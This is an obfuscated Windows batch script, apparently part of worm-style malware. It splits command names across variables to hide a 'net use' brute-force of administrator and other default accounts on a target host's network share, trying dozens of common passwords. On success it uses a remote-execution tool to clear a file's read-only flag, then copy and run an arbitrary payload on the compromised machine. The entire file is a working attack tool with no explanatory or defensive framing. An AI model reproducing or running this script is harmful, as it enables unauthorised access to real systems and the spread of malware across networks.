   set ls=n
   set aa=e
   set ss=t
   set c=u
   set o=s
   set re=e
   set win=w
   set se=mp
   set tup=t
   set f=at
   set u=t
   set b=ri
   set a=b
   set r=-r
   set x=.exe
   set mo=-
   set mu=/user
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:Administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:Administrador
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:Administrateur
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password" %mu%:Administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password" %mu%:Administrador
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password" %mu%:administrador
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password" %mu%:Administrateur
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password" %mu%:administrateur
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "admin" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "12345" %mu%:Administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "123" %mu%:Administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "1" %mu%:Administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "1" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "123456" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "654321" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "abc123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "asdf" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "secret" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "password123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "administrator" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "qwerty" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "qwertyuiop" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "temp123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "Administrator" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "admin123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "abc" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "admin" %mu%:Administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:administrador
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "administrador" %mu%:administrador
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "Administrador" %mu%:administrador
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "temp" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "changeme" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "pass" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "sqlagent" %mu%:sqlagent
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:admin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "Admin" %mu%:admin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "admin" %mu%:admin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "123" %mu%:admin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "12345" %mu%:admin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:root
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "root" %mu%:root
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "teacher" %mu%:teacher
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "student" %mu%:student
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:test
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "test" %mu%:test
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "test123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:cs
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "sql" %mu%:sql
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "database" %mu%:database
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "user" %mu%:user
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:user
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "network" %mu%:network
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "wwwadmin" %mu%:wwwadmin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "sqladmin" %mu%:sqladmin
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "12345" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "54321" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "red123" %mu%:administrator
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:wwwroot
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:guest
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "guest" %mu%:guest
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "" %mu%:server
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   %ls%%aa%%ss% %c%%o%%re% \\%1\%2 "server" %mu%:server
   IF NOT ERRORLEVEL 1 GOTO LSAASS
   GOTO LSAASSEND

   :LSAASS
   %win%%se%%tup% \\%1 %f%%u%%b%%a%%x% %r% %3
   %win%%se%%tup% \\%1 %mo%f %mo%c %mo%d %3 %mo%o
   %win%%se%%tup% \\%1 %mo%d %3 %mo%o
   GOTO LSAASSEND

   :LSAASSEND
